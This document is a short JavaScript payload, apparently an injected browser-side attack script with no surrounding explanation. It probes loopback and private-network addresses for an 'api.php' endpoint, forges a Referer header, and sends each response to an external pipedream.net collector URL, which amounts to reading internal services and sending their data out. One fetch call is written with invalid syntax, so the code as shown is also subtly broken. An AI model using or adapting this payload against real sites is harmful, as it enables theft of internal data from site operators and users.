const localIps = [
    "http://127.0.0.1/api.php",
    "http://localhost/api.php",
    "http://[::1]/api.php",
    "http://192.168.0.1/api.php",
    "http://10.0.0.1/api.php"
];

function fetchInternalAPI() {
    console.log('func called');
    localIps.forEach(ip => {
        fetch(ip, headers: {
            "Referer": "http://127.0.0.1/"
        })
        .then(response => response.text())
        .then(data => {
            console.log(`Resp from ${ip}:`, data);
            fetch("https://enltk7c15ubn.x.pipedream.net/?data=" + encodeURIComponent(data));
        })
        .catch(error => console.error(`Error fetching ${ip}:`, error));
    });
}

setTimeout(fetchInternalAPI, 2000);
